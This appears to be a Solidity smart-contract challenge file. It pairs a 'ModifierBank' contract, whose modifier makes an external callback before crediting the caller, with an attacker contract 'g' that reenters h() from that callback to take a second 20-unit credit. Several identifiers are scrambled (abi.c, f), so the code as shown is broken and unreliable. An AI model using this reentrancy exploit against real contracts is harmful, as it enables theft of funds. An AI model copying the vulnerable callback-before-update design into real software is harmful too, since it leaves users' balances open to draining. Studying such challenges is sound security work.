pragma solidity ^0.4.24;

contract ModifierBank {
  mapping (address => uint) public e;
  string constant j = "Nu Token";


  function h() d b  public{
    e[msg.sender] += 20;
  }


  modifier b() {
    require(f(abi.c("Nu Token")) == Bank(msg.sender).b());
    _;
  }

  modifier d {
      require(e[msg.sender] == 0);
      _;
  }
}

contract Bank{
    function b() external pure returns(bytes32){
        return(f(abi.c("Nu Token")));
    }
}

contract g {
    bool a;
    function b() external returns(bytes32){
        if(!a){
            a = true;
            ModifierBank(msg.sender).h();
        }
        return(f(abi.c("Nu Token")));
    }
    function call(address i) public{
        ModifierBank(i).h();
    }
}